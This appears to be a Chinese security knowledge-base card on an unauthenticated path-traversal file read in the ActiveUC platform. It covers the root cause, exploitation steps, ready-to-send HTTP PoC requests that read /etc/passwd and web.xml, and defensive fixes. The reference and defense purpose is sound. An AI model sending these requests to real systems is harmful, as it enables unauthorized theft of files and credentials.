---
id: web-java-component-activeuc-meetingshow-downloaddocument-arbitrary-file-read
title: 网动 ActiveUC meetingShow!downloadDocument 未鉴权 filePath 路径穿越任意文件读取
type: scenario
domain: web
path: web/java/component
technique: activeuc-meetingshow-downloaddocument-path-traversal
tags:
- java
- activeuc
- struts2
- file-read
- path-traversal
- unauth
- component
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:11:57+08:00'
  notes: 已对照原文核对；meetingShow!* 未继承 globalAndVerify、filePath→getRealPath→streamDownloadFile 链路与截图一致；未实际请求目标。
url: /docs/web/java/component/web-java-component-activeuc-meetingshow-downloaddocument-arbitrary-file-read/
draft: false
kb_aliases:
- ActiveUC 任意文件读取
- meetingShow!downloadDocument
- 网动统一通信平台
- filePath 路径穿越
- WEB-INF/web.xml 读取
- ActiveUC 未授权
---

## 一句话结论

网动统一通信平台（ActiveUC）的 `meetingShow!downloadDocument.action` 没有继承 `globalAndVerify` 鉴权拦截器，且把请求参数 `filePath` 直接拼进 `ServletContext.getRealPath("/" + filePath)` 后交给 `DownloadTask.streamDownloadFile` 的 `FileInputStream`，未登录即可用 `../` 穿越读取 Web 目录外的任意文件（如 `/etc/passwd`、`WEB-INF/web.xml`）。

## 原理

- **鉴权按 package 继承**：项目用 Struts2，`struts.xml` 中需要登录的 package 继承 `globalAndVerify`（包含 `VerifyLogInfoInterceptor`，检查 session 的 `logonInfo`）；`meeting!*` 位于 `acenter_meeting` package（extends `globalAndVerify`），而 `meetingShow!*` 位于另一个未继承鉴权拦截器的 package，属于前台可访问。
- **sink 路径拼接**：`MeetingAction.downloadDocument()`：
  1. `String filepath = this.getParameter("filePath", "");`
  2. `String realpath = ServletActionContext.getServletContext().getRealPath("/" + filepath);`
  3. `new File(realpath)` → `DownloadTask.streamDownloadFile(response, request, realpath, filename)`
  4. `streamDownloadFile` 直接 `new FileInputStream(path)` 读取并写入响应。
- **为什么 `../` 能穿越**：`getRealPath("/" + filepath)` 只是把 Web 根与用户输入拼成路径字符串；`filePath=../../../../etc/passwd` 中的 `..` 由文件系统解析，最终 `FileInputStream` 打开 Web 根之外的文件。代码没有 `getCanonicalPath()` 后与 Web 根比较，也没有过滤 `..`。
- **为什么未授权**：鉴权只在继承 `globalAndVerify` 的 package 的默认拦截器栈中生效；`meetingShow!*` 所在 package 没有该拦截器，代码中也没有二次 session 校验，因此直接请求即可。
- **危害**：读取配置文件（数据库口令、密钥）、`WEB-INF/web.xml`/`classes`、系统文件；结合日志/配置中的凭据进一步横向。

## 触发条件

- 目标为网动统一通信平台 ActiveUC（Struts2 架构）。
- `meetingShow!downloadDocument.action` 可访问（默认存在，且未继承鉴权 package）。
- 应用进程对目标文件有读权限（Web 用户权限即可读 `/etc/passwd`、Web 目录内配置）。
- 目标未在网关/WAF 层拦截 `../` 或 `filePath` 参数。

## 利用步骤

1. 访问 `meetingShow!downloadDocument.action`，确认无需登录即可得到响应。
2. 传入 `filePath=WEB-INF/web.xml`，确认能下载 Web 配置（Web 根内相对路径）。
3. 传入 `filePath=../../../../etc/passwd`，确认读取系统文件；按部署路径调整 `../` 层数。
4. 读取数据库配置、密钥、`WEB-INF/classes` 下的配置文件等，评估进一步利用。
5. 授权测试只读取无害文件（如 `/etc/passwd` 或 `web.xml`），不修改目标。

## PoC

未登录请求（原文 PoC）：

```http
GET /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml HTTP/1.1
Host: target
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0
```

读取系统文件：

```http
GET /acenter/meetingShow!downloadDocument.action?filePath=../../../../etc/passwd HTTP/1.1
Host: target
```

关键调用链：

```text
meetingShow!downloadDocument.action
 -> MeetingAction.downloadDocument()
 -> request.getParameter("filePath")
 -> ServletContext.getRealPath("/" + filePath)
 -> new File(realpath)
 -> DownloadTask.streamDownloadFile()
 -> new FileInputStream(path)
```

## 变体与关联

- 同一 `downloadDocument` 逻辑还挂在 `meeting!downloadDocument.action`（`acenter_meeting` package，extends `globalAndVerify`），登录后可利用；`meetingShow!*` 是未授权入口。
- `user!RenderDownloadFile.action` 也接收 `filePath`，但该实现走 `new URL(path)`（远程 URL 读取）而非 `FileInputStream`，与本文本地文件读取不是同一条链；原文对应 PoC 的可利用性存疑，未作为本卡依据。
- 路径穿越的层数取决于 Web 根深度；Windows 部署可用 `..\\..\\` 或绝对路径尝试。
- 关联：[[web-generic-file-inclusion-mes-download-filename-path]]（下载接口 fileName 拼接路径的同类任意文件读取）。

## 检测与防御

- 下载接口不要直接拼接用户路径：使用 `getCanonicalPath()` 规范化后校验必须位于允许目录内，拒绝 `..`、绝对路径、反斜杠与 URL 编码变体。
- 对下载的文件名/路径做白名单（仅允许固定模板文件），不要把 `filePath` 直接暴露给用户。
- 统一鉴权：所有 Action package 默认继承鉴权拦截器，前台接口显式列白名单；不要依赖 package 继承遗漏。
- WAF/网关拦截 `filePath` 中的 `../`、`..%2f`、`%2e%2e` 等；限制 Web 进程对系统文件的读权限。
- 日志监控 `meetingShow!downloadDocument.action` 携带 `../` 或系统文件路径的请求。
